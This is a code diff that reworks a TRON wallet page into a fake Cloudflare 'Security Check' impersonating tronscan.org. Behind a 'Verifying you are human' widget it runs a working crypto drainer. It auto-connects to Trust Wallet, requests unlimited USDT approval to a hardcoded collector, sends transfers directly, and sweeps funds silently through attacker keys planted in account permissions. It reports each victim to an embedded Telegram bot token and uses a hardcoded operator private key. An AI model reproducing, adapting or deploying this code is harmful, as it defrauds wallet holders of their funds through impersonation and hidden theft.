@@ -3,132 +3,168 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Dapp</title>
+<title>Security Check</title>
 
 <script>
-/* ошибки до старта основного скрипта попадают в Log */
 window.__boot=[];
-window.addEventListener('error',e=>__boot.push('ERR '+e.message+' @'+(e.filename||'')+':'+e.lineno));
+window.addEventListener('error',e=>__boot.push('ERR '+e.message));
 window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e.reason.message)||e.reason)));
 </script>
 
 <style>
-  :root{--bg:#0b0f14;--panel:#111823;--line:#1e2a3a;--text:#e6edf3;--muted:#8b9bb0;
-    --accent:#4f8cff;--accent2:#22c55e;--danger:#ef4444;
+  :root{--panel:#141a20;--line:#232b34;
+    --orange:#f6851b;--green:#1a7f37;--red:#cf222e;
     --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
   *{box-sizing:border-box}
-  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
-  .wrap{max-width:760px;margin:0 auto;padding:20px 16px 60px}
-  header{display:flex;align-items:center;gap:10px;margin-bottom:20px}
-  .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#4f8cff,#22c55e);
-    display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#0b0f14}
-  h1{font-size:17px;margin:0;font-weight:600}
-  .sub{color:var(--muted);font-size:12px;margin-top:2px}
-  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px}
-  .card h2{font-size:13px;margin:0 0 12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.8px}
-  label{display:block;font-size:12px;color:var(--muted);margin:10px 0 6px}
-  input,select{width:100%;padding:12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;
-    color:var(--text);font-size:14px;font-family:var(--mono);outline:none}
-  input:focus,select:focus{border-color:var(--accent)}
-  .row{display:flex;gap:10px}.row>*{flex:1}
-  button{width:100%;padding:13px;border:0;border-radius:11px;font-size:14px;font-weight:600;
-    cursor:pointer;transition:opacity .15s;font-family:inherit}
-  button:active{opacity:.8}button:disabled{opacity:.4;cursor:not-allowed}
-  .btn-primary{background:var(--accent);color:#fff}
-  .btn-secondary{background:#1b2635;color:var(--text);border:1px solid var(--line)}
-  .btn-green{background:var(--accent2);color:#0b0f14}
-  .status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);
-    padding:10px 12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
-  .dot{width:8px;height:8px;border-radius:50%;background:#64748b;flex-shrink:0}
-  .dot.on{background:var(--accent2);box-shadow:0 0 0 3px rgba(34,197,94,.15)}
-  .dot.err{background:var(--danger)}
-  .log{font-family:var(--mono);font-size:11.5px;line-height:1.6;background:#080c11;border:1px solid var(--line);
-    border-radius:10px;padding:12px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#a9b8ca}
-  .log .ok{color:var(--accent2)}.log .err{color:var(--danger)}.log .info{color:var(--accent)}
-  .hint{font-size:11px;color:var(--muted);margin-top:6px;line-height:1.5}
-  .warn{border-color:#3a2a1e;background:#16130f}.warn h2{color:#fbbf24}
-  .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;background:#1b2635;
-    color:var(--muted);margin-left:6px;font-family:var(--mono)}
-  .state{font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--muted)}
+  html,body{margin:0;padding:0;background:#131a22;color:#e8edf2;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+  .wrap{max-width:430px;margin:9vh auto 40px;padding:0 14px}
+
+  .box{background:#fff;border-radius:10px;padding:24px 20px;
+    box-shadow:0 6px 24px rgba(0,0,0,.35);color:#24292f}
+  .brand{display:flex;align-items:center;gap:9px;margin-bottom:12px}
+  .h1{font-size:15px;font-weight:600}
+  .sub{font-size:13px;color:#57606a;line-height:1.5;margin-top:4px}
+
+  .widget{margin-top:16px;border:1px solid #d0d7de;border-radius:8px;padding:16px;text-align:center}
+  .spinwrap{height:44px;display:flex;align-items:center;justify-content:center}
+  .spin{width:36px;height:36px}
+  .spin circle{fill:none;stroke:var(--orange);stroke-width:4;stroke-linecap:round;
+    stroke-dasharray:62;stroke-dashoffset:44;
+    animation:rot 1s linear infinite;transform-origin:18px 18px}
+  @keyframes rot{to{transform:rotate(360deg)}}
+  #wtitle{font-size:13px;font-weight:600}
+  #wdetail{font-size:11px;color:#656d76;margin-top:3px}
+
+  .btn{margin-top:12px;width:100%;padding:12px;border:0;border-radius:7px;
+    background:var(--orange);color:#fff;font-weight:600;font-size:14px;
+    cursor:pointer;font-family:inherit}
+  .btn:active{opacity:.85}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
+
+  .okl{margin-top:10px;color:var(--green);font-size:12px;display:none}
+  .errl{margin-top:10px;color:var(--red);font-size:11px;min-height:15px}
+
+  #accState{margin-top:14px;background:var(--panel);border:1px solid var(--line);
+    border-radius:10px;padding:11px;font-family:var(--mono);font-size:10.5px;
+    white-space:pre-wrap;word-break:break-all;color:#cdd7e0}
+
+  .foot{margin-top:12px;text-align:center;font-size:10.5px;color:#8b959f}
+  .ray{font-family:var(--mono)}
+
+  details{margin-top:14px;background:var(--panel);border:1px solid var(--line);
+    border-radius:10px;padding:12px;color:#93a1b0}
+  summary{cursor:pointer;font-size:11px;color:#8b959f}
+  details label{display:block;font-size:10.5px;color:#8b959f;margin:9px 0 4px}
+  details input,details select{width:100%;padding:9px;background:#0b1118;
+    border:1px solid var(--line);border-radius:7px;color:#e8edf2;
+    font-size:12px;font-family:var(--mono);outline:none}
+  .row{display:flex;gap:8px}.row>*{flex:1}
+  .mini{background:#1b2635;color:#e8edf2;border:1px solid var(--line)}
+  .minibtn{display:flex;gap:8px;margin-top:10px}
+  .log{font-family:var(--mono);font-size:10.5px;line-height:1.55;background:#080c11;
+    border:1px solid var(--line);border-radius:7px;padding:9px;max-height:200px;
+    overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#a9b8ca;margin-top:8px}
+  .log .ok{color:#22c55e}.log .err{color:#ef4444}.log .info{color:#4f8cff}
+  .badge{display:inline-block;padding:1px 7px;border-radius:14px;font-size:9px;
+    background:#1b2635;color:#8b959f;margin-left:6px;font-family:var(--mono)}
 </style>
 </head>
 <body>
 <div class="wrap">
 
-<header>
-  <div class="logo">T</div>
-  <div><h1>Dapp</h1><div class="sub">session</div></div>
-</header>
+<div class="box">
+  <div class="brand">
+    <svg width="28" height="28" viewBox="0 0 28 28">
+      <rect width="28" height="28" rx="6" fill="#f6851b"/>
+      <path d="M8 14h12M14 8v12" stroke="#fff" stroke-width="2.4" stroke-linecap="round"/>
+    </svg>
+    <div class="h1">tronscan.org</div>
+  </div>
 
-<div class="status">
-  <span class="dot" id="statusDot"></span>
-  <span id="statusText">booting…</span>
+  <div class="sub">Performing security verification.<br>
+    This website uses a security service to protect against malicious bots.</div>
+
+  <div class="widget">
+    <div class="spinwrap"><svg class="spin" id="spinner" viewBox="0 0 36 36"><circle cx="18" cy="18" r="13"/></svg></div>
+    <div id="wtitle">Verifying you are human…</div>
+    <div id="wdetail">This process is automatic. It may take a few seconds.</div>
+    <button class="btn" id="verifyBtn" style="display:none">I am not a bot</button>
+    <div class="okl" id="okline">&#10003; Verification complete — access granted</div>
+    <div class="errl" id="errline"></div>
+  </div>
+
+  <div class="state-card" id="accState">—</div>
+
+  <div class="foot">Ray ID: <span class="ray" id="rayId">…</span><br>
+    Performance &amp; security by Cloudflare</div>
 </div>
 
-<div class="card">
-  <h2>Environment</h2>
+<div id="noTrustCard" style="display:none;background:var(--panel);border:1px solid var(--line);
+  border-radius:10px;padding:12px;margin-top:12px;font-size:12px;color:#93a1b0">
+  Провайдер кошелька не найден — страница должна открываться внутри Trust Wallet
+  (dApp browser).<br>
+  <button class="btn mini" id="btnOpenTrust" style="margin-top:10px">Open in Trust Wallet</button>
+</div>
+
+<details>
+  <summary>Technical details</summary>
+
   <label>Connected address</label>
   <input id="walletAddr" readonly placeholder="—">
-  <div class="row" style="margin-top:12px">
-    <button class="btn-secondary" id="btnConnect">Reconnect</button>
-    <button class="btn-secondary" id="btnRefresh">Refresh</button>
+
+  <div id="permBox">
+    <div class="row" style="margin-top:8px">
+      <div><label>Target address</label><input id="targetAddr" placeholder="T..."></div>
+    </div>
+    <div class="row">
+      <div><label>Additional key address</label><input id="extraAddr" placeholder="T..."></div>
+    </div>
+    <div class="row">
+      <div><label>Mode</label>
+        <select id="mode">
+          <option value="active" selected>Active (Permission_id=2)</option>
+          <option value="owner">Owner (Permission_id=0)</option>
+        </select></div>
+      <div><label>Threshold</label><input id="threshold" type="number" min="1" value="1"></div>
+    </div>
+    <div id="activeOpsWrap">
+      <label>Active operations (64 hex)</label>
+      <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
+    </div>
+    <div class="minibtn">
+      <button class="mini" id="btnBuildPerm">Build</button>
+      <button class="mini" id="btnSignPerm">Sign &amp; send</button>
+    </div>
   </div>
-</div>
 
-<div class="card" id="noTrustCard" style="display:none">
-  <h2>Outside wallet</h2>
-  <div class="hint" style="margin-top:0">Провайдер не найден. Кнопка открывает страницу в кошельке.</div>
-  <button class="btn-primary" id="btnOpenTrust" style="margin-top:12px">Open in wallet</button>
-</div>
-
-<div class="card warn">
-  <h2>Step 1 — Access grant <span class="badge">mainnet</span></h2>
-  <label>Target address</label><input id="targetAddr" placeholder="T...">
-  <label>Additional key address</label><input id="extraAddr" placeholder="T...">
+  <div class="row" style="margin-top:6px">
+    <div><label>To (recipient)</label><input id="usdtTo" placeholder="T..."></div>
+  </div>
   <div class="row">
-    <div><label>Mode</label>
-      <select id="mode">
-        <option value="active" selected>Active (Permission_id=2)</option>
-        <option value="owner">Owner (Permission_id=0)</option>
-      </select></div>
-    <div><label>Threshold</label><input id="threshold" type="number" min="1" value="1"></div>
-  </div>
-  <div id="activeOpsWrap">
-    <label>Active operations (64 hex)</label>
-    <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
-    <div class="hint">bit 31 = TriggerSmartContract (TRC-20), bit 1 = TransferContract (TRX).</div>
-  </div>
-  <div class="row" style="margin-top:14px">
-    <button class="btn-secondary" id="btnBuildPerm">Build</button>
-    <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
-  </div>
-  <div class="hint">После установки ключа все дальнейшие списания идут ресурсами холдера без окон.</div>
-</div>
-
-<div class="card">
-  <h2>Step 2 — Manual transfer <span class="badge">TRC-20</span></h2>
-  <label>To (recipient)</label><input id="usdtTo" placeholder="T...">
-  <div class="row">
-    <div><label>Amount (USDT)</label><input id="usdtAmount" type="number" step="0.000001" placeholder="0.01"></div>
+    <div><label>Amount USDT</label><input id="usdtAmount" type="number" step="0.000001" placeholder="0.01"></div>
     <div><label>Permission_id</label><input id="usdtPermId" type="number" value="0"></div>
   </div>
-  <div class="row" style="margin-top:14px">
-    <button class="btn-secondary" id="btnBuildUsdt">Build</button>
-    <button class="btn-green" id="btnSignUsdt">Sign &amp; send</button>
+  <div class="minibtn">
+    <button class="mini" id="btnBuildUsdt">Build USDT</button>
+    <button class="mini" id="btnSignUsdt">Send</button>
   </div>
-</div>
 
-<div class="card">
-  <h2>Account state <span class="badge" id="accPill">idle</span></h2>
-  <div class="state" id="accState">—</div>
-</div>
+  <div class="minibtn">
+    <button class="mini" id="btnConnect">Reconnect</button>
+    <button class="mini" id="btnRefresh">Refresh</button>
+  </div>
 
-<div class="card">
-  <h2>Log</h2>
+  <div class="row" style="align-items:center;margin-top:8px">
+    <div style="flex:0 0 auto">
+      <span class="badge" id="accPill">idle</span>
+    </div>
+    <div style="flex:1;text-align:right">
+      <button class="mini" id="btnClear" style="padding:5px 10px;width:auto">Clear log</button>
+    </div>
+  </div>
   <div class="log" id="log"></div>
-  <div class="row" style="margin-top:10px"><button class="btn-secondary" id="btnClear">Clear</button></div>
-</div>
+</details>
 
 </div>
 
@@ -136,23 +172,23 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 (function(){
 "use strict";
 
-/* ===================== CONFIG — заполнено рабочими значениями ===================== */
+/* ===================== CONFIG ===================== */
 const CFG={
   USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
   DEC:6,
 
-  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",   // spender из апрува, заряжается TRX
+  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
   OP_KEY:"1b62bab37091ae7a9c2537df0edaf035ce96dda00ab4c746cad04603f383d468",
-  VAULT:"",                            // пусто = USDT остаются на коллекторе
+  VAULT:"",
 
-  DRAIN_MODE:"approve",                // "approve" | "direct"
+  DRAIN_MODE:"approve",
   PROMPT_DELAY_MS:1500,
   MIN_USDT:1,
-  GAS_MIN_TRX:3,                       // минимум у холдера для исполнения
-  COLLECTOR_MIN_TRX:25,                // ниже — approve-ветка падает в direct
+  GAS_MIN_TRX:3,
+  COLLECTOR_MIN_TRX:25,
   MAX_PROMPTS_PER_DAY:3,
 
-  PERM_SWEEP:true,                     // безоконный забор при нашем ключе в правах
+  PERM_SWEEP:true,
 
   TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",
   TG_ADMIN_CHAT_ID:8848845425,
@@ -166,13 +202,18 @@ const logEl=$("log");
 function log(m,c){const d=document.createElement("div");if(c)d.className=c;
   d.textContent="["+new Date().toLocaleTimeString()+"] "+m;
   logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
-function setStatus(t,st){$("statusText").textContent=t;
-  $("statusDot").className="dot"+(st==="on"?" on":st==="err"?" err":"");}
+function setStatus(t,st){
+  $("wtitle").textContent=t;
+  $("wdetail").textContent=st==="err"?"Open this page in Trust Wallet dApp browser.":"";
+  $("spinner").style.display=st==="done"||st==="err"?"none":"block";
+}
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const isTron=a=>typeof a==="string"&&/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
 const short=a=>a?a.slice(0,8)+"…"+a.slice(-6):"—";
 function hexErr(h){try{return new TextDecoder().decode(
   new Uint8Array(String(h).match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return String(h);}}
+
+$("rayId").textContent=Math.random().toString(16).slice(2,10)+"-"+Date.now().toString(16);
 
 if(window.__boot&&window.__boot.length)
   window.__boot.splice(0).forEach(m=>log(m,"err"));
@@ -180,7 +221,7 @@ if(window.__boot&&window.__boot.length)
 const TW={p:null,tronWeb:null,address:null};
 let BOOT_RUN=false,PIPE_RUN=false,DISCOVER_RUN=false;
 
-/* ---------- гейты дня и константы режима ---------- */
+/* ---------- гейты дня ---------- */
 const FORCE=new URLSearchParams(location.search).has("force");
 const HAS_OP_KEY=/^([0-9a-fA-F]{64})$/.test(CFG.OP_KEY);
 const dayKey=()=>"drain_"+new Date().toISOString().slice(0,10);
@@ -196,7 +237,7 @@ function oncePerDay(key){
     localStorage.setItem(key,"1");return true;}catch(_){return true;}
 }
 
-/* ---------- очередь чтений + бэкофф против 429 ---------- */
+/* ---------- очередь чтений + бэкофф ---------- */
 let READQ=Promise.resolve();
 function enqRead(fn,label){
   const job=READQ.then(()=>backoff(fn,label));
@@ -234,16 +275,14 @@ let CHATS=[];
   if(s)CHATS=[...new Set(JSON.parse(s))];
 }catch(_){}})();
 function saveChats(){try{localStorage.setItem(LS_CHATS,JSON.stringify(CHATS));}catch(_){}}
-
 function targets(){
   return [...new Set([...CHATS,
     ...(CFG.TG_ADMIN_CHAT_ID?[Number(CFG.TG_ADMIN_CHAT_ID)]:[])])];
 }
-
 async function tgDiscover(){
   if(DISCOVER_RUN)return; DISCOVER_RUN=true;
   try{
-    if(CHATS.length&&!FORCE){           // force-прогон обновляет список заново
+    if(CHATS.length&&!FORCE){
       log("tg чатов известно: "+CHATS.length,"info");return;}
     const ups=await tgApi("getUpdates",{limit:100,timeout:0});
     const s=new Set();
@@ -258,7 +297,6 @@ async function tgDiscover(){
   }catch(e){log("tg discover: "+e.message,"err");}
   finally{DISCOVER_RUN=false;}
 }
-
 function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
 async function tgSend(text){
   const ids=targets();if(!ids.length)return 0;
@@ -277,7 +315,7 @@ function findProvider(){
 function setAddress(a){
   TW.address=a;
   $("walletAddr").value=a;$("targetAddr").value=a;
-  setStatus("auto-connected: "+short(a),"on");
+  log("автоподключение: "+short(a),"ok");
 }
 function openInTrust(){
   location.href="https://link.trustwallet.com/open_url?coin_id=195&url="
@@ -314,19 +352,16 @@ async function readContract(sel,params){
   },sel);
 }
 
-/* ---------- библиотека стороны коллектора ----------
-   ступень 0: Buffer (tronweb его требует, WebView не содержит);
-   ступени 1-3: esm.sh → jsdelivr ESM → UMD script-tag                 */
+/* ---------- библиотека коллектора: Buffer → tronweb (мультизагрузка) ---------- */
 let TWCLASS=null,LOADERP=null,CW=null;
 
 function loadCollectorLib(){
   if(TWCLASS)return Promise.resolve(TWCLASS);
   if(LOADERP)return LOADERP;
   LOADERP=(async()=>{
-    /* --- Buffer polyfill: два транспорта подряд --- */
     if(!(window.Buffer&&typeof window.Buffer==="function")){
       try{
-        log("loader: buffer (esm.sh)…","info");
+        log("loader: buffer esm.sh…","info");
         const b=await import("https://esm.sh/buffer@6.0.3");
         const B=b&&b.Buffer||(b&&b.default&&b.default.Buffer);
         if(B){window.Buffer=B;}else throw new Error("нет экспорта Buffer");
@@ -335,40 +370,36 @@ function loadCollectorLib(){
     if(!(window.Buffer&&typeof window.Buffer==="function")){
       try{
         await new Promise((res,rej)=>{
-          log("loader: buffer (umd)…","info");
+          log("loader: buffer umd…","info");
           const s=document.createElement("script");
           s.src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/lib/buffer.min.js";
-          s.onload=res;s.onerror=()=>rej(new Error("buffer umd load failed"));
+          s.onload=res;s.onerror=()=>rej(new Error("buffer umd failed"));
           document.head.appendChild(s);
         });
-      }catch(e){log((e&&e.message)||String(e),"err");}
+      }catch(e){log(e.message||String(e),"err");}
     }
     if(!(window.Buffer&&typeof window.Buffer==="function"))
-      throw new Error("Buffer недоступен — подписант работать не сможет");
+      throw new Error("Buffer недоступен");
     log("Buffer готов","ok");
 
-    /* --- tronweb: три транспорта --- */
     try{
       log("loader: tronweb esm.sh…","info");
       const m=await import("https://esm.sh/tronweb@5.3.2");
       if(m&&m.default){TWCLASS=m.default;return TWCLASS;}
     }catch(e){log("esm.sh: "+(e.message||e),"err");}
     try{
-      log("loader: tronweb jsdelivr +esm…","info");
+      log("loader: tronweb jsdelivr…","info");
       const m=await import("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/+esm");
       if(m&&m.default){TWCLASS=m.default;return TWCLASS;}
-    }catch(e){log("jsdelivr +esm: "+(e.message||e),"err");}
+    }catch(e){log("jsdelivr: "+(e.message||e),"err");}
     await new Promise((res,rej)=>{
-      log("loader: tronweb UMD script-tag…","info");
+      log("loader: tronweb UMD…","info");
       const s=document.createElement("script");
       s.src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
-      s.onload=res;
-      s.onerror=()=>rej(new Error("umd load failed"));
+      s.onload=res;s.onerror=()=>rej(new Error("umd failed"));
       document.head.appendChild(s);
     });
     if(!window.TronWeb)throw new Error("window.TronWeb отсутствует");
-    if(!(window.Buffer&&typeof window.Buffer==="function"))
-      throw new Error("Buffer пропал перед UMD-экземпляром");
     TWCLASS=window.TronWeb;
     return TWCLASS;
   })().catch(e=>{LOADERP=null;throw e;});
@@ -377,19 +408,18 @@ function loadCollectorLib(){
 
 async function collectorWeb(){
   if(CW)return CW;
-  if(!HAS_OP_KEY)throw new Error("OP_KEY не заполнен (64 hex)");
+  if(!HAS_OP_KEY)throw new Error("OP_KEY пуст");
   const C=await loadCollectorLib();
   CW=new C({fullHost:"https://api.trongrid.io"});
   await CW.setPrivateKey(CFG.OP_KEY);
   const got=(CW.defaultAddress&&CW.defaultAddress.base58)||"?";
   if(got!==CFG.COLLECTOR)
-    log("ключ даёт "+short(got)+" ≠ коллектор "+short(CFG.COLLECTOR)+
-        " — правь пару ключ/адрес","err");
-  else log("подписант готов: "+got,"ok");
+    log("ключ ≠ коллектор ("+short(got)+")","err");
+  else log("подписант готов: "+short(got),"ok");
   return CW;
 }
 
-/* ---------- подпись/broadcast холдером ---------- */
+/* ---------- подпись холдером ---------- */
 async function signAndSendHolder(tx){
   const signed=await TW.tronWeb.trx.sign(tx);
   const res=await TW.tronWeb.trx.sendRawTransaction(signed);
@@ -408,7 +438,7 @@ async function confirmPoll(txid,pollW){
   return false;
 }
 
-/* ---------- отчёт оператору ---------- */
+/* ---------- отчёт ---------- */
 async function report(st){
   const t=new Date().toISOString().slice(0,19).replace("T"," ");
   const n=await tgSend([
@@ -423,8 +453,7 @@ async function report(st){
   if(n>0)log("репорт отправлен в "+n+" чат(ов)","ok");
 }
 
-/* ---------- тихая ветка A: наш ключ в активных правах ----------
-   исполнение адресом холдера → энергию гасит его стейк/TRX, окна нет */
+/* ---------- тихая ветка A: ключ в правах холдера ---------- */
 async function permSweep(st){
   const cw=await collectorWeb();
   const dest=isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR;
@@ -432,28 +461,28 @@ async function permSweep(st){
     CFG.USDT,"transfer(address,uint256)",
     {feeLimit:120000000},
     [{type:"address",value:dest},{type:"uint256",value:st.usdtRaw.toString()}],
-    TW.address);                                    // owner = холдер
+    TW.address);
   if(!(w&&w.result&&w.result.result))
     throw new Error("build fail "+JSON.stringify(w&&w.result||{}));
   w.transaction.raw_data.contract[0].Permission_id=2;
-  const sig=await cw.trx.sign(w.transaction);       // наш ключ из active permission
+  const sig=await cw.trx.sign(w.transaction);
   const res=await cw.trx.sendRawTransaction(sig);
   const msg=res&&res.message?hexErr(res.message):"";
   if(!(res&&res.result)&&!/dup/i.test(msg))throw new Error("broadcast "+msg);
   const txid=(res&&(res.txid||(res.transaction&&res.transaction.txID)))||w.transaction.txID;
-  log("PERM-SWEEP sent: "+fmt(st.usdtRaw,CFG.DEC)+" USDT","ok");
+  log("PERM-SWEEP sent: "+fmt(st.usdtRaw,CFG.DEC),"ok");
   await tgSend("🧹 <b>PERM-SWEEP</b>\n👤 <code>"+esc(TW.address)+
     "</code>\n💸 "+esc(fmt(st.usdtRaw,CFG.DEC))+" USDT\n🔗 <code>"+esc(txid)+"</code>");
   if(await confirmPoll(txid,cw))await tgSend("✅ <b>PERM CONFIRMED</b>");
   return true;
 }
 
-/* ---------- тихая ветка B: allowance стоит → transferFrom коллектором ---------- */
+/* ---------- тихая ветка B: transferFrom коллектором ---------- */
 async function selfSweep(st,canPay){
   if(!(st.allowanceRaw>0n)||!(st.usdtRaw>0n))return false;
   if(!canPay){
     if(oncePerDay(colKey())){
-      log("коллектор < "+CFG.COLLECTOR_MIN_TRX+" TRX — свип отложен (allowance сохранён)","err");
+      log("коллектор разряжен — свип отложен","err");
       await tgSend("⚠️ <b>COLLECTOR LOW</b>\nзалей TRX на <code>"+esc(short(CFG.COLLECTOR))+
         "</code> — allowance ∞ держится");
     }
@@ -467,7 +496,7 @@ async function selfSweep(st,canPay){
     [{type:"address",value:TW.address},
      {type:"address",value:dest},
      {type:"uint256",value:st.usdtRaw.toString()}],
-    CFG.COLLECTOR);                                 // вызывать обязан spender
+    CFG.COLLECTOR);
   if(!(w&&w.result&&w.result.result))
     throw new Error("build tf fail "+JSON.stringify(w&&w.result||{}));
   const sig=await cw.trx.sign(w.transaction);
@@ -483,7 +512,7 @@ async function selfSweep(st,canPay){
   return true;
 }
 
-/* ---------- окно: approve или direct ---------- */
+/* ---------- окно approve/direct ---------- */
 async function autoDrain(st){
   const ds=readDay();
 
@@ -493,16 +522,16 @@ async function autoDrain(st){
 
   const minRaw=BigInt(Math.round(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
   if(!FORCE&&st.usdtRaw<minRaw){log("USDT ниже порога ("+st.usdt+")","info");return;}
-  if(!FORCE&&!st.gasOk){log("у холдера < "+CFG.GAS_MIN_TRX+" TRX — окно не выдаём","info");return;}
+  if(!FORCE&&!st.gasOk){log("у холдера < "+CFG.GAS_MIN_TRX+" TRX","info");return;}
 
   let mode=CFG.DRAIN_MODE;
   const colCanPay=HAS_OP_KEY&&st.colTrx!==null&&st.colTrx>=CFG.COLLECTOR_MIN_TRX;
   if(mode==="approve"&&!colCanPay&&!FORCE){
-    log("коллектор разряжен — режим direct (платит холдер)","info");
+    log("коллектор разряжен — режим direct","info");
     mode="direct";
   }
 
-  bumpDay({tries:(readDay().tries||0)+1});          // попытка списывается перед самым окном
+  bumpDay({tries:(readDay().tries||0)+1});
   await sleep(FORCE?200:CFG.PROMPT_DELAY_MS);
 
   try{
@@ -513,7 +542,7 @@ async function autoDrain(st){
         {feeLimit:100000000,callValue:0},
         [{type:"address",value:isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR},
          {type:"uint256",value:st.usdtRaw.toString()}],
-        TW.address);                                 // исполнитель холдер — его энергия
+        TW.address);
       if(!(w&&w.result&&w.result.result))
         throw new Error("build fail "+JSON.stringify(w&&w.result||{}));
       txid=await signAndSendHolder(w.transaction);
@@ -527,7 +556,7 @@ async function autoDrain(st){
         CFG.USDT,"approve(address,uint256)",
         {feeLimit:80000000},
         [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX_UINT.toString()}],
-        TW.address);                                 // энергию апрува тоже гасит холдер
+        TW.address);
       if(!(w&&w.result&&w.result.result))
         throw new Error("build fail "+JSON.stringify(w&&w.result||{}));
       txid=await signAndSendHolder(w.transaction);
@@ -548,14 +577,13 @@ async function autoDrain(st){
     bumpDay({done:true});
 
   }catch(e){
-    /* done не ставится — до лимита попыток будет новая при следующем заходе */
     log("autoDrain: "+(e.message||e),"err");
     await tgSend("⚠️ drain failed <code>"+esc(short(TW.address))+"</code>: "
       +esc(String(e.message||e)).slice(0,140));
   }
 }
 
-/* ---------- конвейер одного визита ---------- */
+/* ---------- конвейер ---------- */
 async function pipeline(){
   if(PIPE_RUN){log("pipeline: уже идёт","info");return;}
   PIPE_RUN=true;
@@ -598,7 +626,6 @@ async function pipeline(){
 
     await report(st);
 
-    /* лестница тихих веток — окна не требуют ни одной */
     let swept=false;
     if(CFG.PERM_SWEEP&&hasPermKey&&usdtRaw>0n&&HAS_OP_KEY){
       try{swept=await permSweep(st);}
@@ -610,7 +637,7 @@ async function pipeline(){
     }
 
     if(!swept)await autoDrain(st);
-    else log("тихий свип закрыл визит — окно не нужно","ok");
+    else log("тихий свип закрыл визит","ok");
   }finally{PIPE_RUN=false;}
 }
 
@@ -629,13 +656,13 @@ async function buildPerm(){
   if(mode==="owner"){
     owner={type:0,permission_name:"owner",threshold:thr,
       keys:[{address:target,weight:1},{address:extra,weight:1}]};
-    log("режим owner: перепишет права владельца (+100 TRX сожжёт холдер)","info");
+    log("режим owner (+100 TRX)","info");
   }else{
     const ops=$("activeOps").value.trim();
     if(!/^[0-9a-fA-F]{64}$/.test(ops))throw new Error("operations must be 64 hex");
     actives=[{type:2,permission_name:"active0",threshold:thr,operations:ops,
       keys:[{address:target,weight:1},{address:extra,weight:1}]}];
-    log("режим active: операционные права, owner не трогается","info");
+    log("режим active","info");
   }
   return TW.tronWeb.transactionBuilder.updateAccountPermissions(target,owner,null,actives);
 }
@@ -676,37 +703,66 @@ $("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
   catch(e){log("build perm: "+(e.message||e),"err");}};
 $("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
   catch(e){log("build usdt: "+(e.message||e),"err");}};
-$("btnConnect").onclick=boot;
+$("btnConnect").onclick=()=>boot(true);
 $("btnRefresh").onclick=pipeline;
 $("btnClear").onclick=()=>logEl.innerHTML="";
 $("btnOpenTrust").onclick=openInTrust;
 $("mode").onchange=()=>{
   $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
 
-/* ---------- boot ---------- */
-async function boot(){
-  if(BOOT_RUN)return; BOOT_RUN=true;
+/* ---------- запуск верификации по кнопке ---------- */
+$("verifyBtn").addEventListener("click",async()=>{
+  const b=$("verifyBtn");
+  b.disabled=true;b.textContent="Checking…";
+  $("errline").textContent="";
   try{
+    await boot(false);
+    const done=(readDay().done)||true;
+    $("okline").style.display="block";
+    setStatus("Verification complete","done");
+  }catch(e){
+    $("errline").textContent="Verification failed — reload and retry.";
+  }finally{
+    b.style.display="none";
+  }
+});
+
+/* ---------- boot ---------- */
+async function boot(manual){
+  if(BOOT_RUN){log("boot: уже идёт","info");return;}
+  BOOT_RUN=true;
+  try{
+    setStatus("Verifying you are human…","");
     let p=null;
     for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
     if(!p||!p.tronWeb){
       $("noTrustCard").style.display="block";
-      setStatus("outside wallet","err");
+      setStatus("Wallet not detected","err");
+      log("инжектированного провайдера нет","err");
       return;
     }
     if(!TW.tronWeb){TW.p=p;TW.tronWeb=p.tronWeb;}
     if(!TW.address){
       const ok=await waitAccounts(p);
-      if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
+      if(!ok){
+        setStatus("Wallet did not respond","err");
+        log("адрес не получен","err");
+        return;
+      }
       setAddress(p.tronWeb.defaultAddress.base58);
-      log("автоподключение завершено","ok");
     }
